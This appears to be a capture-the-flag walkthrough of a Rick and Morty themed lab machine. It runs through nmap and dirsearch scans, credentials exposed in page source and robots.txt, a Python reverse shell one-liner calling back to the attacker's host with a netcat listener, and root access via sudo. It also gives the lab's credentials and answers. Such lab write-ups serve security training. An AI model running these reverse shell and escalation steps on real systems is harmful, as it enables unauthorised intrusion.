
### Let Start!!###

```
nmap -sS -sV -A 10.48.153.187  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 12:09 -0400
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.48.153.187
Host is up (0.076s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2b:33:8a:07:de:c6:99:9b:62:0a:0b:f9:2c:29:49:d7 (RSA)
|   256 f3:ec:7d:32:44:95:06:0a:25:04:3c:7c:58:3d:1a:3e (ECDSA)
|_  256 74:c3:44:b3:09:eb:2a:4a:11:e8:27:7b:94:d2:73:02 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=6/6%OT=22%CT=1%CU=42945%PV=Y%DS=3%DC=T%G=Y%TM=6A24468C
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=106%TI=Z%C
OS:I=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=107%GCD=2%I
OS:SR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT1
OS:1NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4
OS:B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   204.04 ms 192.168.128.1
2   ...
3   200.05 ms 10.48.153.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.76 seconds
                                                             
```


***open Browser***

==http://10.48.153.187/

And soursecode  read ==view-source:http://10.48.153.187/

and Find the ***Username:R1ckRul3s***

```
<!DOCTYPE html> <html lang="en"> <head> <title>Rick is sup4r cool</title> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <link rel="stylesheet" href="[assets/bootstrap.min.css](view-source:http://10.48.153.187/assets/bootstrap.min.css)"> <script src="[assets/jquery.min.js](view-source:http://10.48.153.187/assets/jquery.min.js)"></script> <script src="[assets/bootstrap.min.js](view-source:http://10.48.153.187/assets/bootstrap.min.js)"></script> <style> .jumbotron { background-image: url("assets/rickandmorty.jpeg"); background-size: cover; height: 340px; } </style> </head> <body> <div class="container"> <div class="jumbotron"></div> <h1>Help Morty!</h1></br> <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br> <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br> </div> <!-- Note to self, remember username! Username: R1ckRul3s
 --> </body> </html>
```


```
dirsearch -u http://10.48.153.187  -t 15 -e php,html,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                                                       
                                                                                                                                                              
Extensions: php, html, txt | HTTP method: GET | Threads: 15 | Wordlist size: 10403

Output File: /home/kali/reports/http_10.48.153.187/_26-06-06_12-23-02.txt

Target: http://10.48.153.187/

[12:23:02] Starting:                                                                                                                                          
[12:23:05] 403 -  278B  - /.ht_wsr.txt                                      
[12:23:05] 403 -  278B  - /.htaccess.bak1                                   
[12:23:05] 403 -  278B  - /.htaccess.orig                                   
[12:23:05] 403 -  278B  - /.htaccess.sample
[12:23:05] 403 -  278B  - /.htaccess.save
[12:23:05] 403 -  278B  - /.htaccess_extra                                  
[12:23:05] 403 -  278B  - /.htaccess_orig
[12:23:05] 403 -  278B  - /.htaccess_sc
[12:23:05] 403 -  278B  - /.htaccessBAK
[12:23:05] 403 -  278B  - /.htaccessOLD
[12:23:05] 403 -  278B  - /.htaccessOLD2                                    
[12:23:05] 403 -  278B  - /.htm                                             
[12:23:05] 403 -  278B  - /.html
[12:23:05] 403 -  278B  - /.htpasswd_test                                   
[12:23:05] 403 -  278B  - /.htpasswds
[12:23:05] 403 -  278B  - /.httr-oauth
[12:23:07] 403 -  278B  - /.php                                             
[12:23:17] 301 -  315B  - /assets  ->  http://10.48.153.187/assets/         
[12:23:17] 200 -  589B  - /assets/
[12:23:32] 200 -  455B  - /login.php                                        
[12:23:42] 200 -   17B  - /robots.txt                                       
[12:23:43] 403 -  278B  - /server-status                                    
[12:23:43] 403 -  278B  - /server-status/
                                                                             
Task Completed                                                                                                                                                
                                           
```


***Password*** find ==http://10.48.153.187//robots.txt


***password=Wubbalubbadubdub***



login penel :==http://10.48.153.187/login.php

***use reverse shell generator***
Make python reverse shell ==https://www.revshells.com/

```

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.234.105",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

```
nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.234.105] from (UNKNOWN) [10.48.153.187] 38248
$ whoami
whoami
www-data
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls
ls
Sup3rS3cretPickl3Ingred.txt  clue.txt    index.html  portal.php
assets                       denied.php  login.php   robots.txt
$ pwd
pwd
/var/www/html
$ cd ../../../..
cd ../../../..
$ ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
$ cd home
cd home
$ ls
ls
rick  ubuntu
$ cd rick
cd rick
$ ls
ls
'second ingredients'
$ sudo bash -i
sudo bash -i
root@ip-10-48-153-187:/home/rick# ls
ls
'second ingredients'
root@ip-10-48-153-187:/home/rick# pwd
pwd
/home/rick
root@ip-10-48-153-187:/home/rick# cd ../../../
cd ../../../
root@ip-10-48-153-187:/# ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
root@ip-10-48-153-187:/# cd root
cd root
root@ip-10-48-153-187:~# ls
ls
3rd.txt  snap
root@ip-10-48-153-187:~# cat 3rd.txt
cat 3rd.txt
3rd ingredients: fleeb juice
root@ip-10-48-153-187:~# 

```

